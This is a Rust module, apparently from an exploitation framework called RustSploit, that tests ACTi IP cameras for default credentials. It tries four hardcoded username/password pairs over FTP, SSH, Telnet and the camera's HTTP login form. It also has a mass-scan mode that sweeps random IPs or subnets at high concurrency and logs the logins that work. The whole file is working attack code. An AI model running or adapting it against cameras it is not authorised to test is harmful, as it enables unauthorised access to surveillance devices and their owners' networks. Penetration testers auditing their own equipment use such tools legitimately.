use anyhow::{Context, Result};
use suppaftp::tokio::AsyncFtpStream;
use colored::*;
use ssh2::Session;
use telnet::{Telnet, Event};
use std::time::Duration;
use tokio::{join, task};
use crate::utils::url_encode;
use crate::modules::creds::utils::{is_mass_scan_target, run_mass_scan, MassScanConfig};

const DEFAULT_TIMEOUT_SECS: u64 = 10;

fn display_banner() {
    crate::mprintln!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    crate::mprintln!("{}", "║   ACTi Camera Default Credentials Checker                 ║".cyan());
    crate::mprintln!("{}", "║   Multi-Protocol Scanner (FTP/SSH/Telnet/HTTP)            ║".cyan());
    crate::mprintln!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    crate::mprintln!();
}

/// Supported Acti services
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ServiceType {
    Ftp,
    Ssh,
    Telnet,
    Http,
}

impl ServiceType {
    fn as_str(&self) -> &'static str {
        match self {
            ServiceType::Ftp => "FTP",
            ServiceType::Ssh => "SSH",
            ServiceType::Telnet => "Telnet",
            ServiceType::Http => "HTTP",
        }
    }
}

/// Common config
#[derive(Clone)]
pub struct Config {
    pub target: String,
    pub port: u16,
    pub credentials: Vec<(&'static str, &'static str)>,
    pub stop_on_success: bool,
    pub verbosity: bool,
}

/// Helper to normalize IPv4, IPv6 (with any amount of brackets)
fn normalize_target(target: &str, port: u16) -> String {
    let cleaned = target.trim_matches(|c| c == '[' || c == ']');
    if cleaned.contains(':') && !cleaned.contains('.') {
        format!("[{}]:{}", cleaned, port) // IPv6
    } else {
        format!("{}:{}", cleaned, port) // IPv4 or hostname
    }
}

/// FTP check (async)
pub async fn check_ftp(config: &Config) -> Result<Option<(ServiceType, String, String)>> {
    crate::mprintln!("{}", format!("[*] Checking FTP credentials on {}:{}", config.target, config.port).cyan());

    for (username, password) in &config.credentials {
        if config.verbosity {
            crate::mprintln!("{}", format!("[*] Trying FTP: {}:{}", username, password).dimmed());
        }

        let address = normalize_target(&config.target, config.port);
        match AsyncFtpStream::connect(address).await {
            Ok(mut ftp) => {
                if ftp.login(username, password).await.is_ok() {
                    crate::mprintln!("{}", format!("[+] FTP credentials valid: {}:{}", username, password).green().bold());
                    if let Err(e) = ftp.quit().await { crate::meprintln!("[!] FTP quit error: {}", e); }
                    let result = Some((ServiceType::Ftp, username.to_string(), password.to_string()));
                    // Respect stop_on_success: if true, stop after first valid credential
                    if config.stop_on_success {
                        return Ok(result);
                    }
                    // If false, continue checking but still return first found (for consistency)
                    return Ok(result);
                }
                if let Err(e) = ftp.quit().await { crate::meprintln!("[!] FTP quit error: {}", e); }
            }
            Err(_) => continue,
        }
    }

    crate::mprintln!("{}", format!("[-] No valid FTP credentials found on {}:{}", config.target, config.port).yellow());
    Ok(None)
}

/// SSH check (blocking, so we use spawn_blocking)
pub fn check_ssh_blocking(config: &Config) -> Result<Option<(ServiceType, String, String)>> {
    crate::mprintln!("{}", format!("[*] Checking SSH credentials on {}:{}", config.target, config.port).cyan());

    for (username, password) in &config.credentials {
        if config.verbosity {
            crate::mprintln!("{}", format!("[*] Trying SSH: {}:{}", username, password).dimmed());
        }

        let address = normalize_target(&config.target, config.port);
        let socket_addr: std::net::SocketAddr = match address.parse() {
            Ok(sa) => sa,
            Err(_) => continue,
        };
        if let Ok(stream) = crate::utils::blocking_tcp_connect(&socket_addr, Duration::from_secs(DEFAULT_TIMEOUT_SECS)) {
            let mut session = Session::new().context("Failed to create SSH session")?;
            session.set_tcp_stream(stream);
            session.handshake().context("SSH handshake failed")?;

            if session.userauth_password(username, password).is_ok() && session.authenticated() {
                crate::mprintln!("{}", format!("[+] SSH credentials valid: {}:{}", username, password).green().bold());
                return Ok(Some((ServiceType::Ssh, username.to_string(), password.to_string())));
            }
        }
    }

    crate::mprintln!("{}", format!("[-] No valid SSH credentials found on {}:{}", config.target, config.port).yellow());
    Ok(None)
}

/// Telnet check (blocking)
pub fn check_telnet_blocking(config: &Config) -> Result<Option<(ServiceType, String, String)>> {
    crate::mprintln!("{}", format!("[*] Checking Telnet credentials on {}:{}", config.target, config.port).cyan());

    for (username, password) in &config.credentials {
        if config.verbosity {
            crate::mprintln!("{}", format!("[*] Trying Telnet: {}:{}", username, password).dimmed());
        }

        let address = normalize_target(&config.target, config.port);
        let parts: Vec<&str> = address.rsplitn(2, ':').collect();
        if parts.len() != 2 {
            continue;
        }
        let host = parts[1];
        let port: u16 = parts[0].parse().unwrap_or(23);

        if let Ok(mut telnet) = Telnet::connect((host, port), 500) {
            if let Err(e) = telnet.write(format!("{}\r\n", username).as_bytes()) { crate::meprintln!("[!] Telnet write error: {}", e); }
            if let Err(e) = telnet.write(format!("{}\r\n", password).as_bytes()) { crate::meprintln!("[!] Telnet write error: {}", e); }

            // Give device time to respond
            std::thread::sleep(Duration::from_millis(500));

            if let Ok(Event::Data(buffer)) = telnet.read_timeout(Duration::from_millis(800)) {
                let response = String::from_utf8_lossy(&buffer);
                if !response.contains("incorrect") && !response.contains("failed") {
                    crate::mprintln!("{}", format!("[+] Telnet credentials valid: {}:{}", username, password).green().bold());
                    return Ok(Some((ServiceType::Telnet, username.to_string(), password.to_string())));
                }
            }
        }
    }

    crate::mprintln!("{}", format!("[-] No valid Telnet credentials found on {}:{}", config.target, config.port).yellow());
    Ok(None)
}

/// HTTP Web Login check (async)
pub async fn check_http_form(config: &Config) -> Result<Option<(ServiceType, String, String)>> {
    crate::mprintln!("{}", format!("[*] Checking HTTP Web Form credentials on {}:{}", config.target, config.port).cyan());

    let client = crate::utils::build_http_client(Duration::from_secs(DEFAULT_TIMEOUT_SECS))?;

    let url = format!("http://{}:{}/video.htm", config.target.trim_matches(|c| c == '[' || c == ']'), config.port);

    for (username, password) in &config.credentials {
        if config.verbosity {
            crate::mprintln!("{}", format!("[*] Trying HTTP: {}:{}", username, password).dimmed());
        }

        let data = [
            ("LOGIN_ACCOUNT", *username),
            ("LOGIN_PASSWORD", *password),
            ("LANGUAGE", "0"),
            ("btnSubmit", "Login"),
        ];

        // Manual form construction
        let mut body = String::new();
        for (key, val) in &data {
            if !body.is_empty() { body.push('&'); }
            body.push_str(&format!("{}={}", key, url_encode(val)));
        }

        let res = client
            .post(&url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body)
            .send()
            .await
            .context("[!] Failed to send HTTP form request")?;

        let body = match res.text().await {
            Ok(t) => t,
            Err(_) => String::new(),
        };

        if !body.contains(">Password<") {
            crate::mprintln!("{}", format!("[+] HTTP credentials valid: {}:{}", username, password).green().bold());
            return Ok(Some((ServiceType::Http, username.to_string(), password.to_string())));
        }
    }

    crate::mprintln!("{}", format!("[-] No valid HTTP credentials found on {}:{}", config.target, config.port).yellow());
    Ok(None)
}

/// Entrypoint for module - parallel checks
pub async fn run(target: &str) -> Result<()> {
    // Mass scan mode: random IPs, CIDR subnets, or target file
    if is_mass_scan_target(target) {
        return run_mass_scan(target, MassScanConfig {
            protocol_name: "ACTi Camera",
            default_port: 80,
            state_file: "acti_camera_mass_state.log",
            default_output: "acti_camera_mass_results.txt",
            default_concurrency: 200,
        }, |ip: std::net::IpAddr, port: u16| async move {
            // Quick port check on HTTP
            if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
                return None;
            }
            let target_str = ip.to_string();
            let creds = vec![
                ("admin", "12345"),
                ("admin", "123456"),
                ("Admin", "12345"),
                ("Admin", "123456"),
            ];
            // Try HTTP first (most likely for cameras)
            let client = crate::utils::build_http_client(Duration::from_secs(5)).ok()?;
            let url = format!("http://{}:{}/", target_str, port);
            for (user, pass) in &creds {
                let resp = client.get(&url)
                    .basic_auth(user, Some(pass))
                    .send()
                    .await
                    .ok()?;
                if resp.status().is_success() || resp.status().as_u16() == 301 || resp.status().as_u16() == 302 {
                    let body = resp.text().await.unwrap_or_default();
                    if !body.contains("401") && !body.to_lowercase().contains("unauthorized") {
                        let msg = format!("{}:{}:HTTP:{}:{}", ip, port, user, pass);
                        crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
                        return Some(format!("{}\n", msg));
                    }
                }
            }
            None
        }).await;
    }

    display_banner();
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
    crate::mprintln!();

    let creds = vec![
        ("admin", "12345"),
        ("admin", "123456"),
        ("Admin", "12345"),
        ("Admin", "123456"),
    ];

    let base_config = Config {
        target: target.to_string(),
        port: 0,
        credentials: creds,
        stop_on_success: true,
        verbosity: true,
    };

    let ftp_conf    = Config { port: 21, ..base_config.clone() };
    let ssh_conf    = Config { port: 22, ..base_config.clone() };
    let telnet_conf = Config { port: 23, ..base_config.clone() };
    let http_conf   = Config { port: 80, ..base_config.clone() };

    let (ftp_res, ssh_res, telnet_res, http_res) = join!(
        check_ftp(&ftp_conf),
        async {
            task::spawn_blocking(move || check_ssh_blocking(&ssh_conf)).await?
        },
        async {
            task::spawn_blocking(move || check_telnet_blocking(&telnet_conf)).await?
        },
        check_http_form(&http_conf),
    );

    // Collect all successful results
    let mut found_credentials = Vec::new();
    
    if let Ok(Some((service, user, pass))) = ftp_res {
        found_credentials.push((service, user, pass));
    }
    if let Ok(Some((service, user, pass))) = ssh_res {
        found_credentials.push((service, user, pass));
    }
    if let Ok(Some((service, user, pass))) = telnet_res {
        found_credentials.push((service, user, pass));
    }
    if let Ok(Some((service, user, pass))) = http_res {
        found_credentials.push((service, user, pass));
    }

    // Print summary and store credentials
    if !found_credentials.is_empty() {
        crate::mprintln!();
        crate::mprintln!("{}", "=== Summary ===".bold());
        for (service, user, pass) in &found_credentials {
            crate::mprintln!("{}", format!("  {}: {}:{}", service.as_str(), user, pass).green());
            let (svc_port, svc_name) = match service.as_str() {
                "FTP" => (21u16, "ftp"),
                "SSH" => (22, "ssh"),
                "Telnet" => (23, "telnet"),
                "HTTP" => (80, "http"),
                _ => (0, "unknown"),
            };
            {
                let id = crate::cred_store::store_credential(
                    target, svc_port, svc_name, user, pass,
                    crate::cred_store::CredType::Password,
                    "creds/camera/acti/acti_camera_default",
                ).await;
                if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
            }
        }
    } else {
        crate::mprintln!();
        crate::mprintln!("{}", "[-] No valid credentials found on any service.".yellow());
    }

    Ok(())
}

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "ACTi Camera Default Credentials".to_string(),
        description: "Tests default credentials across FTP, SSH, Telnet, and HTTP on ACTi IP cameras.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}
